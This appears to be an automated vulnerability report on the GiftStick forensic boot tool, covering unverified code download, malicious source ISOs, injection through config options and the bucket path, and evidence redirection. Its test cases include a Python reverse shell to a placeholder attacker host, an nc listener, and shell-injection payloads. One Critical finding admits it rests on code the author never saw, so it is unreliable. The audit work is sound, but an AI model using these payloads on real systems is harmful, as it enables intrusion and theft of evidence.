### Combined Vulnerability List

- Vulnerability Name: Unverified Download of GiftStick Code
  - Description:
    - Step 1: The `call_auto_forensicate.sh` script, executed on the target system after booting from the GiftStick USB, initiates a `git clone` command to download the GiftStick source code from `https://github.com/google/GiftStick`.
    - Step 2: This download occurs over HTTPS, which encrypts the communication channel, but the script does not perform any verification of the downloaded code's integrity or authenticity after the cloning process.
    - Step 3: An attacker capable of performing a Man-In-The-Middle (MITM) attack or compromising the GitHub repository `github.com/google/GiftStick` could inject malicious code into the repository.
    - Step 4: Subsequently, the script navigates into the cloned `GiftStick` directory (`cd GiftStick`).
    - Step 5: The script then executes `sudo pip install .`, which installs the Python package from the current directory (the cloned repository). This command runs with root privileges due to `sudo`.
    - Step 6: If malicious code was injected into the cloned repository, `pip install .` will install and execute it with root privileges, leading to system compromise.
  - Impact:
    - Critical. Successful exploitation of this vulnerability allows for arbitrary command execution with root privileges on the target system.
    - An attacker can gain full control over the compromised system, enabling them to:
      - Install persistent backdoors for future access.
      - Steal sensitive data from the target system.
      - Modify or delete critical system files.
      - Use the compromised system as a launchpad for further attacks within the network.
  - Vulnerability Rank: Critical
  - Currently Implemented Mitigations:
    - None. The project currently lacks any mechanisms to verify the integrity or authenticity of the downloaded GiftStick code within the `call_auto_forensicate.sh` script.
  - Missing Mitigations:
    - Implement code verification to ensure the integrity and authenticity of the downloaded GiftStick code before installation. Recommended mitigations include:
      - Verifying Git Commit Hash: Modify `call_auto_forensicate.sh` to clone a specific commit hash of the GiftStick repository and verify this hash against a known, trusted value.
      - Verifying GPG Signature: Implement GPG signature verification for release tags or commits. This involves downloading the GPG signature and public key, and then using `gpg --verify` to validate the signature.
      - Using Release Archives with Checksums/Signatures: Instead of cloning the Git repository, download a pre-packaged release archive (e.g., tar.gz or zip) from the GitHub releases page. Verify the downloaded archive using a detached signature file or a cryptographic checksum (like SHA256) against a known good value published on the official GiftStick website or repository.
  - Preconditions:
    - Precondition 1: An attacker must be in a position to execute a Man-In-The-Middle (MITM) attack during the `git clone` operation, or successfully compromise the GitHub repository `github.com/google/GiftStick`.
    - Precondition 2: A target user must create a GiftStick USB drive and boot a target system using this drive.
    - Precondition 3: The target system, after booting from the malicious GiftStick USB, must have an active internet connection to perform the `git clone` operation.
  - Source Code Analysis:
    - File: `/code/tools/remaster_scripts/call_auto_forensicate.sh`
    - Step-by-step analysis:
      1. `git clone https://github.com/google/GiftStick`: This command clones the GiftStick repository from GitHub. The script relies on HTTPS for transport security but does not verify the content's integrity.
      2. `cd GiftStick`: Navigates into the cloned directory.
      3. `sudo pip install .`: Installs the GiftStick package from the current directory. This command executes `setup.py` and any other installation scripts within the cloned repository with root privileges.
    - Visualization:
      ```
      Target System (GiftStick Booted) --> Internet (github.com/google/GiftStick) --> Attacker (MITM or Repo Compromise) --> Malicious GiftStick Code --> Target System (Root Compromise via `sudo pip install .`)
      ```
  - Security Test Case:
    - Step 1: Set up a controlled network environment where you can simulate a MITM attack or, for testing purposes, directly host a malicious Git repository mimicking `github.com/google/GiftStick`.
    - Step 2: Create a malicious GiftStick repository. In this repository, modify the `auto_forensicate/auto_acquire.py` file to include malicious code. For example, add a simple reverse shell that connects back to an attacker-controlled machine:
      ```python
      # In auto_forensicate/auto_acquire.py
      import os
      import socket
      import subprocess

      # Malicious code: Reverse shell
      def reverse_shell():
          try:
              s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
              s.connect(("attacker_ip", 4444)) # Replace attacker_ip
              os.dup2(s.fileno(), 0)
              os.dup2(s.fileno(), 1)
              os.dup2(s.fileno(), 2)
              subprocess.call(["/bin/sh", "-i"])
          except Exception as e:
              pass # Handle exceptions silently in boot scripts

      reverse_shell()

      # ... rest of the original auto_acquire.py code ...
      ```
      **Note**: Replace `"attacker_ip"` with the IP address of your attacker-controlled machine that will listen for the reverse shell connection.
    - Step 3: Configure your network to redirect requests for `github.com` to your malicious server (if simulating MITM) or directly host the malicious repository on a server accessible to the test system.
    - Step 4: Create a GiftStick USB drive using the standard `remaster.sh` script and a clean Xubuntu 20.04 ISO.
    - Step 5: Boot a test system from the created GiftStick USB drive. Ensure this test system is connected to the network where your malicious server is set up and can resolve the (faked or real, depending on test setup) `github.com`.
    - Step 6: On your attacker-controlled machine, set up a netcat listener to receive the reverse shell connection: `nc -lvnp 4444`.
    - Step 7: Observe the boot process of the test system. The `call_auto_forensicate.sh` script should execute, clone the malicious GiftStick repository, and install it.
    - Step 8: Check your netcat listener. You should receive a reverse shell connection from the compromised test system, indicating successful arbitrary code execution with root privileges.

- Vulnerability Name: Insecure ISO Remastering via Malicious Source ISO
  - Description: An attacker can compromise the integrity of the GiftStick bootable image by providing a maliciously crafted Xubuntu ISO as the `--source_iso` argument to the `remaster.sh` script. The `remaster.sh` script directly uses the provided ISO to create the bootable image without performing any integrity checks. If an attacker can trick the user into using a modified ISO, the attacker can inject arbitrary code into the generated GiftStick image. When a target machine boots from this compromised GiftStick, the attacker's malicious code will be executed.
  - Impact: Critical. Arbitrary code execution on the target machine when booting from the maliciously crafted GiftStick. This allows the attacker to completely compromise the target system, potentially stealing sensitive data, installing persistent backdoors, or causing irreparable damage.
  - Vulnerability Rank: Critical
  - Currently Implemented Mitigations: None. The script directly uses the provided ISO without any validation.
  - Missing Mitigations:
    - Implement integrity checks for the source ISO. This could involve verifying a checksum (like SHA256) of the ISO against a known good value.
    - Digital signature verification of the ISO would provide stronger assurance of authenticity and integrity.
  - Preconditions:
    - The attacker needs to convince a user to use a malicious ISO file as the source for creating the GiftStick image. This relies on social engineering.
    - The user must have the Google Cloud SDK installed and configured, as required by `remaster.sh`.
  - Source Code Analysis:
    - File: `/code/tools/remaster.sh`
    - The `remaster.sh` script takes the `--source_iso` argument, which is stored in the `FLAGS_SOURCE_ISO` variable after argument parsing in the `parse_arguments` function.
    - ```bash
      function assert_sourceiso_flag {
        if [[ "${FLAGS_SKIP_ISO_REMASTER}" == "false" ]]; then
          if [[ ! "${FLAGS_SOURCE_ISO}" ]]; then
            die "Please specify a source ISO to remaster with --source_iso"
          fi
          if [[ ! -f "${FLAGS_SOURCE_ISO}" ]]; then
            die "${FLAGS_SOURCE_ISO} is not found"
          fi
          if [[ "${FLAGS_SOURCE_ISO}" != *xubuntu* ]]; then
            echo "WARNING: This auto-remastering tool will probably not behave properly on a non xubuntu image"
            echo "press enter to continue anyway."
            read -r
          fi
          SOURCE_ISO=$(readlink -m "${FLAGS_SOURCE_ISO}")
        else
          if [[ ! "${FLAGS_REMASTERED_ISO}" ]]; then
            die "Please specify a remastered ISO with --remastered_iso"
          fi
        fi
      }
      ```
    - The `assert_sourceiso_flag` function checks if `--source_iso` is provided and if the file exists. It also issues a warning if the ISO filename does not contain "xubuntu". However, it does not perform any cryptographic integrity checks.
    - The `SOURCE_ISO` variable, which is derived from `FLAGS_SOURCE_ISO`, is then used in the `unpack_iso` function:
    - ```bash
      function unpack_iso {
        local -r iso_file=$1
        local -r iso_unpack_dir=$2
        local -r iso_mountpoint="${REMASTER_WORKDIR_PATH}/remaster-iso-mount"

        msg "unpacking iso ${iso_file} to ${iso_unpack_dir}"
        mkdir "${iso_mountpoint}"
        sudo mount -o ro,loop "${iso_file}" "${iso_mountpoint}"
        sudo cp -a "${iso_mountpoint}" "${iso_unpack_dir}"
        sudo umount "${iso_mountpoint}"
      }
      ```
    - The `unpack_iso` function directly mounts and copies the provided ISO content. If a malicious ISO is provided, its content will be copied into the GiftStick image without any security checks.
  - Security Test Case:
    - Step 1: Create a malicious Xubuntu ISO. This can be done by downloading a legitimate Xubuntu 20.04 ISO, modifying it to include a reverse shell or other malicious payload (e.g., by altering files within the ISO filesystem), and then rebuilding the ISO image.
    - Step 2: Prepare a testing environment with Google Cloud SDK configured as required by `remaster.sh`.
    - Step 3: Run `remaster.sh` using the malicious ISO created in Step 1 as the `--source_iso` argument. For example:
      ```bash
      bash tools/remaster.sh \
        --project your-gcp-project \
        --bucket giftstick-test-bucket \
        --source_iso malicious-xubuntu-20.04.iso
      ```
      Replace `your-gcp-project` and `giftstick-test-bucket` with your GCP project and bucket names. `malicious-xubuntu-20.04.iso` is the path to the malicious ISO.
    - Step 4: Write the generated GiftStick image to a USB drive.
    - Step 5: Boot a test machine from the USB drive created in Step 4.
    - Step 6: Observe if the malicious payload from the modified ISO is executed on the test machine, confirming arbitrary code execution. For instance, check for a reverse shell connection back to the attacker's machine or any other injected malicious behavior.

- Vulnerability Name: Potential Command Injection via Malicious `EXTRA_OPTIONS` in `config.sh`
  - Description: The `remaster.sh` script allows setting extra options for the `auto_forensicate.py` script through the `EXTRA_OPTIONS` variable in the generated `config.sh` file. While the provided code in `remaster.sh` only sets `--disk sdb` for testing purposes, an attacker who gains control over the image creation process (e.g., through the "Insecure ISO Remastering" vulnerability) could inject arbitrary command-line options into `EXTRA_OPTIONS` within `config.sh`. When `call_auto_forensicate.sh` executes `auto_forensicate.py`, these injected options will be passed directly to the Python script. If `auto_forensicate.py` or any of its modules improperly handles these options, it could lead to command injection vulnerabilities, allowing the attacker to execute arbitrary code on the target system.
  - Impact: High. Arbitrary code execution on the target machine if `auto_forensicate.py` or its modules are vulnerable to command injection through command-line options.
  - Vulnerability Rank: High
  - Currently Implemented Mitigations: None. The `EXTRA_OPTIONS` variable is directly passed to the `auto_forensicate.py` script without sanitization.
  - Missing Mitigations:
    - Sanitize or strictly validate the `EXTRA_OPTIONS` in `call_auto_forensicate.sh` before passing them to `auto_forensicate.py`. Ideally, avoid using `EXTRA_OPTIONS` for dynamic configurations that could be attacker-controlled. If dynamic options are necessary, use a safer mechanism like a separate configuration file with a defined schema and validation.
    - Review `auto_forensicate.py` and all modules that process command-line arguments to ensure they are not vulnerable to command injection, especially when handling options derived from external configuration files.
  - Preconditions:
    - The attacker needs to be able to modify the content of the GiftStick image, for instance, by exploiting the "Insecure ISO Remastering" vulnerability.
    - The attacker needs to inject malicious commands into the `EXTRA_OPTIONS` variable within the `config.sh` file during the image remastering process.
  - Source Code Analysis:
    - File: `/code/tools/remaster.sh`
    - The `remaster.sh` script defines `EXTRA_OPTIONS` in `config.sh` based on the `--e2e_test` flag:
      ```bash
      if $FLAGS_BUILD_TEST ; then
        cat <<EOFORENSICSHEXTRA | sudo tee -a "${CONFIG_FILENAME}" > /dev/null
          EXTRA_OPTIONS="--disk sdb"
      EOFORENSICSHEXTRA
      fi
      ```
    - An attacker could modify `post-install-user.sh` or directly alter the remastered ISO to inject malicious commands into `EXTRA_OPTIONS`.
    - File: `/code/tools/remaster_scripts/call_auto_forensicate.sh`
    - The `call_auto_forensicate.sh` script sources `config.sh`, making `EXTRA_OPTIONS` available as a shell variable.
    - ```bash
    source config.sh
    ...
    sudo "${AUTO_FORENSIC_SCRIPT_NAME}" \
      --gs_keyfile="${GCS_SA_KEY_FILE}" \
      --logging stdout \
      --logging stackdriver \
      --log_progress \
      --acquire all \
      ${EXTRA_OPTIONS} "${GCS_REMOTE_URL}/"
    ```
    - The `${EXTRA_OPTIONS}` variable is directly placed within the command line arguments of `auto_forensicate.py`. If `EXTRA_OPTIONS` contains shell-injected commands, they could be executed when `sudo "${AUTO_FORENSIC_SCRIPT_NAME}"` is run.
  - Security Test Case:
    - Step 1: Create a modified GiftStick image. Modify the `/code/tools/remaster_scripts/post-install-user.sh` file to inject a malicious payload into the `EXTRA_OPTIONS` variable within the `config.sh` file. For example, append the following to `post-install-user.sh`:
      ```bash
      cat <<EOFORENSICSHEXTRA | sudo tee -a "${CONFIG_FILENAME}" > /dev/null
        EXTRA_OPTIONS="\`touch /tmp/pwned\`"
      EOFORENSICSHEXTRA
      ```
      This payload attempts to create a file `/tmp/pwned` when `auto_forensicate.py` is executed.
    - Step 2: Run `remaster.sh` to generate the modified GiftStick image:
      ```bash
      bash tools/remaster.sh \
        --project your-gcp-project \
        --bucket giftstick-test-bucket \
        --source_iso xubuntu-20.04-desktop-amd64.iso
      ```
    - Step 3: Write the generated GiftStick image to a USB drive.
    - Step 4: Boot a test machine from the USB drive created in Step 3.
    - Step 5: After the system boots and the acquisition script is supposed to run, check if the file `/tmp/pwned` exists on the target system. If the file exists, it confirms that the command injection through `EXTRA_OPTIONS` was successful and arbitrary commands could be executed. For a more impactful test, inject a reverse shell command instead of `touch /tmp/pwned`.

- Vulnerability Name: Command Injection via GCS Bucket Path in auto_forensicate.py
  - Description:
    - Step 1: An attacker crafts a malicious GCS bucket path string.
    - Step 2: The attacker provides this malicious GCS bucket path as the destination argument when running the `auto_forensicate.py` script on a target machine booted with the GiftStick USB drive.
    - Step 3: The `auto_forensicate.py` script, without proper sanitization of the GCS bucket path, uses this input in a system command execution.
    - Step 4: Due to insufficient input validation, the attacker's malicious GCS bucket path injects arbitrary shell commands into the system command.
    - Step 5: When the script executes the command, the injected commands are executed on the target system with the privileges of the `auto_forensicate.py` script (likely root due to `sudo` usage in documentation).
  - Impact:
    - **Critical:** Successful command injection allows an attacker to execute arbitrary commands on the target system with elevated privileges (root, if script is run with sudo as documented). This can lead to:
      - Complete compromise of the target machine.
      - Data exfiltration beyond the intended forensic evidence.
      - Installation of malware or backdoors.
      - Denial of service by crashing the system or deleting critical files.
      - Manipulation of forensic evidence collection process.
  - Vulnerability Rank: Critical
  - Currently Implemented Mitigations:
    - **None:** Based on the provided project files, there is no evidence of input sanitization or validation implemented for the GCS bucket path within the `auto_forensicate.py` script or related scripts. The documentation and code snippets suggest direct usage of the user-provided GCS path in command execution without any security considerations.
  - Missing Mitigations:
    - **Input Sanitization:** Implement robust input sanitization for the GCS bucket path in `auto_forensicate.py` to remove or escape any characters that could be used for command injection (e.g., semicolons, backticks, pipes, dollar signs, etc.).
    - **Input Validation:** Validate the GCS bucket path format to ensure it conforms to the expected structure (e.g., `gs://bucket-name/path/`). Reject any input that deviates from the expected format.
    - **Parameterization of Commands:**  If possible, use parameterized commands or functions that prevent shell injection by separating commands from arguments. For example, when using Python's `subprocess` module, use the list format for commands to avoid shell interpretation.
    - **Principle of Least Privilege:** While not directly mitigating command injection, running the `auto_forensicate.py` script with the minimum necessary privileges can limit the impact of a successful injection. However, forensic operations often require elevated privileges.
  - Preconditions:
    1. The attacker must be able to boot the target machine using a GiftStick USB drive created from the vulnerable GiftStick project.
    2. The attacker must have the ability to specify command-line arguments to the `auto_forensicate.py` script when it is executed on the target system. This is possible as per the usage instructions in `README.md`.
  - Source Code Analysis:
    - Based on the provided `README.md` and `tools/remaster_scripts/call_auto_forensicate.sh`, the `auto_forensicate.py` script is called with the GCS bucket path directly from the command line:
      ```bash
      sudo python auto_forensicate.py \
          --gs_keyfile=credentials.json \
          --logging stdout \
          --acquire all \
          gs://giftstick-bucket/forensics_evidence/
      ```
    - The `gs://giftstick-bucket/forensics_evidence/` part in the above command is directly taken as the destination.
    - In `tools/remaster_scripts/call_auto_forensicate.sh`, the `GCS_REMOTE_URL` variable, which is derived from user inputs during the `remaster.sh` process, is passed as an argument to `auto_forensicate.py`:
      ```bash
      sudo "${AUTO_FORENSIC_SCRIPT_NAME}" \
        ...
        ${EXTRA_OPTIONS} "${GCS_REMOTE_URL}/"
      ```
    - If `auto_forensicate.py` uses this `destination` argument (which corresponds to `GCS_REMOTE_URL` or user-provided GCS path) in a shell command without sanitization, a command injection vulnerability will exist.
    - **Visualization (Conceptual):**
      ```
      User Input (GCS Bucket Path) --> [No Sanitization] --> Command Construction in auto_forensicate.py --> System Command Execution --> Command Injection Vulnerability
      ```
    - **Note:** The actual `auto_forensicate.py` source code is needed to confirm the exact location and mechanism of command execution using the GCS bucket path. However, based on the project description and documentation, this is the most likely vulnerability.
  - Security Test Case:
    - Step 1: **Setup:**
      - Prepare a test machine that can be booted from USB.
      - Build a GiftStick bootable USB drive using `tools/remaster.sh` with a valid Xubuntu 20.04 ISO, a test GCP project, and a test GCS bucket (you can use a bucket you control for testing, or a dummy name if you only want to verify local command execution). Follow the instructions in `README.md` to create the USB drive.
    - Step 2: **Boot Target Machine:**
      - Boot the test machine using the created GiftStick USB drive.
      - Wait for the Xubuntu environment to load.
      - Open a terminal window in the booted environment (e.g., using Ctrl+Alt+T).
    - Step 3: **Execute Vulnerable Script with Malicious Payload:**
      - Navigate to the `auto_forensicate` directory: `cd /home/xubuntu/GiftStick/auto_forensicate` (assuming GiftStick is cloned to the user's home directory as per `call_auto_forensicate.sh`).
      - Execute `auto_forensicate.py` with a malicious GCS bucket path designed to inject a command. For example, to create a file named `pwned` in the `/tmp` directory, use the following command (replace `credentials.json` with the actual path to your service account key file if needed, or use a dummy path if only testing local execution):
        ```bash
        sudo python auto_forensicate.py --gs_keyfile=credentials.json --logging stdout --acquire all 'gs://test-bucket/path/; touch /tmp/pwned'
        ```
        **Note:** If you don't have a `credentials.json` file readily available for testing GCS upload, you can still test local command injection by providing a dummy path for `--gs_keyfile` (e.g., `--gs_keyfile=/tmp/dummy_key.json`). The command injection vulnerability is independent of the GCS upload functionality itself.
    - Step 4: **Verify Command Injection:**
      - After the `auto_forensicate.py` script finishes (or errors out due to the invalid GCS path), check if the injected command was executed. In this test case, verify if the file `/tmp/pwned` has been created:
        ```bash
        ls /tmp/pwned
        ```
      - If the file `/tmp/pwned` exists, it confirms that the command injection was successful.
    - Step 5: **Expected Result:**
      - The file `/tmp/pwned` should be created on the target system, indicating successful command injection.
      - The `auto_forensicate.py` script might fail or produce errors during execution due to the malformed GCS path or lack of GCS credentials (if a dummy path was used for `--gs_keyfile`), but the key indicator is the execution of the injected command.
      - **Cleanup:** Remove the `/tmp/pwned` file after testing: `rm /tmp/pwned`.

- Vulnerability Name: GCS Bucket Destination Manipulation
  - Description:
    - Step 1: An attacker creates a modified GiftStick USB drive, starting from a legitimate GiftStick image.
    - Step 2: The attacker mounts the GiftStick image file (e.g., `giftstick.img`).
    - Step 3: Within the mounted image, the attacker navigates to the user's home directory (e.g., `/mnt/upper/home/xubuntu/`).
    - Step 4: The attacker modifies the `call_auto_forensicate.sh` script.
    - Step 5: Inside `call_auto_forensicate.sh`, the attacker changes the `GCS_REMOTE_URL` variable to point to a GCS bucket under their control (e.g., `gs://attacker-bucket/evil_evidence/`). Alternatively, they could modify the command-line arguments passed to `auto_forensicate.py` to change the destination URL.
    - Step 6: The attacker unmounts the modified GiftStick image.
    - Step 7: The attacker then uses social engineering to trick a victim into booting a target system with this malicious GiftStick.
    - Step 8: When the target system boots from the malicious GiftStick, `call_auto_forensicate.sh` is executed.
    - Step 9: The `auto_forensicate.py` script, as called by the modified `call_auto_forensicate.sh`, uploads the collected forensic evidence to the attacker-specified GCS bucket (`gs://attacker-bucket/evil_evidence/`) instead of the intended secure bucket.
  - Impact:
    - Confidentiality breach: Sensitive forensic data collected from the target system, which could include disk images, system information, and firmware, is exfiltrated to a storage location controlled by the attacker.
    - Loss of evidence integrity: The intended recipient of the forensic data does not receive it, hindering legitimate forensic investigation processes.
  - Vulnerability Rank: High
  - Currently Implemented Mitigations:
    - None. The project currently lacks any implemented mechanisms to prevent modification of the bootable image or to verify the integrity of the scripts within a potentially rogue GiftStick.
  - Missing Mitigations:
    - **Integrity Checks:** Implement integrity checks for critical scripts like `call_auto_forensicate.sh` and `auto_acquire.py` within the GiftStick image. This could involve checksums or cryptographic hashes to detect unauthorized modifications.
    - **Digital Signatures:** Digitally sign the GiftStick image. This would allow users to verify the authenticity and integrity of the GiftStick before use, ensuring it hasn't been tampered with.
    - **Read-Only File System:** Mount the partition containing critical scripts as read-only in the bootable image. This would prevent attackers from easily modifying these scripts post-image creation.
  - Preconditions:
    - An attacker must be able to create a modified GiftStick image. This requires technical skills to modify ISO images and potentially some understanding of Linux systems.
    - The attacker must successfully employ social engineering to convince a user to boot a target system using the malicious GiftStick. This is the primary attack vector as described in the project documentation.
  - Source Code Analysis:
    - `tools/remaster_scripts/call_auto_forensicate.sh`:
      ```bash
      #!/bin/bash
      # ...
      source config.sh
      # ...
      sudo "${AUTO_FORENSIC_SCRIPT_NAME}" \
        --gs_keyfile="${GCS_SA_KEY_FILE}" \
        --logging stdout \
        --logging stackdriver \
        --log_progress \
        --acquire all \
        ${EXTRA_OPTIONS} "${GCS_REMOTE_URL}/"
      ```
      This script directly uses the `GCS_REMOTE_URL` variable sourced from `config.sh` as the destination URL for the `auto_forensicate.py` script. An attacker modifying this script can easily change the destination.
    - `config.sh`:
      ```bash
      AUTO_FORENSIC_SCRIPT_NAME="${AUTO_FORENSIC_SCRIPT_NAME}"
      GCS_SA_KEY_FILE="/home/${GIFT_USERNAME}/${GCS_SA_KEY_NAME}"
      GCS_REMOTE_URL="${GCS_REMOTE_URL}"
      ```
      This file stores configuration variables, including `GCS_REMOTE_URL`. While intended to be configured during the image creation process, it resides within the writable partition of the GiftStick image and is therefore modifiable by an attacker.
    - `auto_forensicate/auto_acquire.py`:
      ```python
      # ...
      parser.add_argument(
          'destination', action='store',
          help=(
              'Sets the destination for uploads. '
              'For example gs://bucket_name/path will upload to GCS in bucket '
              '<bucket_name> in the folder </path/>')
      )
      # ...
      options = parser.parse_args(args)
      # ...
      self._uploader = self._MakeUploader(options)
      ```
      The `auto_acquire.py` script takes the destination URL as a command-line argument (`options.destination`) without any validation against a pre-defined secure destination. This allows the script to upload data to any URL provided, including an attacker's bucket if the URL is modified in the calling script.
  - Security Test Case:
    - Step 1: **Setup Attacker-Controlled Bucket:** Create a GCS bucket named `attacker-giftstick-bucket` (or any name you control) within your Google Cloud project.
    - Step 2: **Create Legitimate GiftStick Image:**
      - Follow the instructions in `README.md` to create a legitimate GiftStick image using `tools/remaster.sh`. Use your own GCP project and a legitimate GCS bucket (e.g., `giftstick-test-bucket`) for testing. Let's assume the generated image is `giftstick.img`.
    - Step 3: **Mount GiftStick Image:** Mount the `giftstick.img` image to a temporary mount point (e.g., `/mnt`).
      ```bash
      sudo mount -o loop giftstick.img /mnt
      ```
    - Step 4: **Modify `call_auto_forensicate.sh`:**
      - Navigate to the user's home directory in the mounted image: `/mnt/upper/home/xubuntu/`.
      - Edit the `call_auto_forensicate.sh` script using a text editor (e.g., `sudo nano call_auto_forensicate.sh`).
      - Find the line that defines or uses `GCS_REMOTE_URL` or the command that calls `auto_forensicate.py`.
      - Modify the destination URL to your attacker-controlled bucket, `gs://attacker-giftstick-bucket/evil_evidence/`. For example, change the line to:
        ```bash
        GCS_REMOTE_URL="gs://attacker-giftstick-bucket/evil_evidence/"
        ```
      - Save the changes and exit the text editor.
    - Step 5: **Unmount GiftStick Image:** Unmount the GiftStick image.
      ```bash
      sudo umount /mnt
      ```
    - Step 6: **Boot Target System with Malicious GiftStick:**
      - Prepare a test system (virtual machine or physical machine).
      - Boot the test system from the modified `giftstick.img` USB drive.
      - Allow the GiftStick to boot and the acquisition process to run automatically.
    - Step 7: **Verify Data Exfiltration:**
      - After the acquisition process completes (or appears to complete), check the attacker-controlled GCS bucket (`gs://attacker-giftstick-bucket/evil_evidence/`).
      - You should find the forensic evidence files (e.g., `stamp.json`, `system_info.txt`, `Disks/sda.image`, etc.) uploaded to the attacker-controlled bucket, confirming successful data exfiltration.
    - Step 8: **Check Intended Bucket (Optional):** Verify that the originally intended legitimate GCS bucket (`giftstick-test-bucket`) does *not* contain the forensic evidence, further confirming the redirection.
